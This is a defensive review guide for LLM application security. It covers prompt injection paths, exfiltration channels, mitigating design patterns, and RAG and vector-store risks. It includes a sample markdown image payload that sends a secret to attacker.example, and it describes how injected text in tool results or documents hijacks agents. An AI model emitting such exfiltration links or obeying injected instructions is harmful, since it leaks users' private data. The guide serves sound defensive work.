# LLM application review

## Start with the lethal trifecta

Simon Willison's framing (June 2025, now echoed in vendor documentation) does
more work than any checklist. For each component that a model drives, ask
whether it simultaneously has:

1. access to private data,
2. exposure to untrusted content,
3. the ability to communicate externally.

Any two of the three are survivable. All three at once is an exfiltration
primitive, and no amount of prompt hardening removes it, because the model is
the confused deputy rather than the vulnerability. Every review must name
which leg was removed for each component and by what mechanism — a network
egress policy, a tool allowlist, a rendering filter, a separate process
boundary. "The system prompt tells it not to" is not a removed leg.

Enumerate components rather than applications. A single product often has a
safe summarizer, a safe retrieval endpoint, and one agent loop that quietly
holds all three legs.

## Direct versus indirect injection

Direct injection is the user typing an adversarial prompt into their own
session. It matters for abuse and content policy, and it is mostly a problem
of the user attacking themselves.

Indirect injection is the class that matters for agents: attacker-controlled
text arriving through a tool result, a retrieved document, a fetched web page,
an email body, an issue or pull-request comment, a filename, a commit message,
a calendar invitation, or a file the agent reads from the workspace. The
attacker never touches the session. Review accordingly:

- List every path by which text the operator does not control reaches the
  context window. Include tool results, not just user input.
- For each path, ask what the agent could be induced to do with the
  capabilities it holds at that moment, and where the output goes.
- Check whether the untrusted text lands in an instruction position — a
  system prompt, a developer message, a tool description, a plan — or in a
  clearly delimited data position with a provenance label.

Corresponds to LLM01 Prompt Injection and, on the agentic list, ASI01 Agent
Goal Hijack and ASI06 Memory and Context Poisoning.

## Exfiltration lives in the rendering layer

Injection is the trigger; the exit is usually something the application
renders or fetches on the model's behalf. Audit each of these explicitly:

- **Markdown image rendering.** `![](https://attacker.example/?d=SECRET)`
  fires a request with no user interaction. This is the canonical
  zero-click channel.
- **Markdown and HTML links** where the client prefetches, unfurls, or
  generates a preview.
- **Tool calls to attacker-supplied hosts** — an HTTP tool, a webhook tool, a
  "fetch this URL" capability.
- **DNS lookups**, which leak through resolution alone even when the
  connection fails.
- **Writes to publicly readable destinations** — a public repository, a
  public bucket, a shared document, an issue comment.
- **Allowlisted-but-writable domains.** An allowlist entry that accepts
  uploads, gists, pastes, or query-string logging is an exfiltration channel
  that happens to be on the allowlist.

**CVE-2025-32711** ("EchoLeak", Microsoft 365 Copilot, CVSS 9.3, published
2025-06-11) is the reference case: an AI command-injection information
disclosure requiring no user interaction. What matters for review is the fix
shape — server-side image proxying and preflighting of emitted URLs, that is,
changes in the rendering and egress layers — **not** a change to the model.
Ask for the equivalent controls in the target.

## Design patterns with an actual security argument

Ask which pattern the design implements. "None" is a permissible answer only
with a written justification, and it should be a finding when the component
holds the full trifecta.

*Design Patterns for Securing LLM Agents against Prompt Injections*
(arXiv 2506.08837) sets out six, all free to read and citable:

| Pattern | Constraint it imposes |
| --- | --- |
| Action-Selector | The model picks from a fixed set of actions and never composes new ones |
| Plan-Then-Execute | The plan is fixed before untrusted data is read, so data cannot change the plan |
| LLM Map-Reduce | Untrusted items are processed in isolation, then aggregated by trusted code |
| Dual LLM | A privileged model never sees untrusted text; a quarantined model sees it and holds no tools |
| Code-Then-Execute | The model emits a program that is reviewed or constrained before it runs |
| Context-Minimisation | Untrusted content is dropped from the context once its extracted value is obtained |

The paper's core claim is the useful one: security comes from constraining
the agent so that it *cannot* perform arbitrary tasks, and no single pattern
suffices for every application.

**CaMeL** (arXiv 2503.18813, `google-research/camel-prompt-injection`) is the
strongest concrete instance to compare against. A privileged model plans from
the trusted user query only; a quarantined model parses untrusted data and
has **no tool access**; a custom interpreter carries data-flow provenance
through the computation and enforces capability policies before every tool
call. When reviewing a design that claims to be injection-resistant, ask
which of those three properties it actually has.

## Control set to verify

- Least-privilege tool allowlists, scoped per task rather than per
  application.
- Human gates on irreversible actions: money movement, deletion, sending
  messages to third parties, merging, deploying, granting access.
- Output between pipeline stages constrained to an enum or a JSON schema
  rather than freeform text. Freeform text between stages is an injection
  carrier.
- Retrieved text never placed in an instruction position, and never
  concatenated into a system prompt.
- Markdown links and images stripped, escaped, or proxied server-side in
  model output before rendering.
- Tool results carrying an explicit provenance label the downstream prompt
  can reference — source, trust level, retrieval time.
- Deny-by-default network egress for any process the model can influence.

## System prompts and consumption

Treat the system prompt as non-secret (LLM07 System Prompt Leakage). It leaks
by extraction, by paraphrase, and by model error. The finding is never "the
system prompt was extracted"; it is "something security-relevant was enforced
only in the system prompt". Check for credentials, internal hostnames,
customer identifiers, business rules, and authorization logic living there.

Enforce per-user token, request, and cost caps server-side (LLM10 Unbounded
Consumption). Caps that exist only in client code or in prompt instructions
do not exist. Check for unbounded recursion in agent loops, unbounded
retrieval fan-out, and unbounded tool-call chains, each of which turns a
single request into an open-ended bill.

## RAG and vector stores

### Poisoning the corpus

PoisonedRAG (arXiv 2402.07867) reports roughly 90% attack success from
injecting five texts per target question into a corpus of a million texts.
A 2026 follow-up (arXiv 2605.05632) finds success spanning 81.9% for vanilla
RAG down to 24.4% for a recursive architecture at comparable clean accuracy.

The engineering consequence: **the generation stage is the weak point, so
defences belong there.** Retrieval-side filtering alone under-performs.
Look for conflict detection across retrieved passages, multi-source
corroboration before an assertion is emitted, and an answer-must-cite
constraint that lets a reviewer trace every claim to a retrieved chunk.

Ingestion controls still matter: who can write to the corpus, whether
ingestion is authenticated, whether a document's provenance survives
chunking, and whether a removed source's chunks are actually removed.

### Access control collapses by default

Chunks do not carry permissions, and an approximate-nearest-neighbour index
has no notion of who is asking. The current state of the common stores:

| Store | Multi-tenant isolation reality |
| --- | --- |
| Qdrant | Partition by payload field; no built-in enforcement of the filter |
| Weaviate | Isolation by shard; no per-tenant RBAC |
| Milvus | Documents that RBAC is not supported at the partition-key level |
| Pinecone | RBAC at organization and project level; namespace-per-tenant is the isolation story |
| pgvector | The outlier — Postgres row-level security applies to vector queries |

Verify the version-specific behaviour against current vendor documentation
before quoting a row; this table is a review prompt, not a compliance
statement.

### Deletion, revocation, and inversion

Deletion is not deletion. Soft-deleted embeddings inside an HNSW index remain
reconstructible (arXiv 2606.18497), so revocation requires compaction or an
index rebuild, not a delete call. Ask what the rebuild cadence is and what the
window looks like between a revocation and the rebuild.

Embedding inversion (vec2text, arXiv 2310.06816) recovers source text from
embeddings with high fidelity. The operative rule: **an embedding is
PII-equivalent to its source text.** Classify, encrypt, retain, and grant
access to the vector store exactly as you would to the documents.

### Mitigations that hold

- **Index-per-tenant** for hard boundaries. The failure mode matters: a
  forgotten filter on a shared index leaks everything silently, while a wrong
  index name errors.
- **Filter inside the ANN traversal**, not after top-k. Post-filtering
  produces empty or short result sets that leak set membership and degrade
  quietly.
- **Re-check ACLs twice** — at retrieval and again at generation — against
  *current* ACLs rather than the snapshot taken at ingestion.
- **Chunk metadata carrying tenant, source, allowed principals, and ACL
  version**, so a stale-permission chunk is detectable rather than merely
  wrong.

### Testing the boundary

**No free tool tests cross-tenant ACL leakage in a vector store.** Build the
test: a synthetic two-tenant corpus, canary documents in each tenant with
distinctive strings, a query suite designed to pull the other tenant's
canaries, and an assertion that the canaries never surface in retrieval or in
generated text. Run it in CI against the real index configuration, and run it
again after any change to filtering, sharding, or the embedding model.
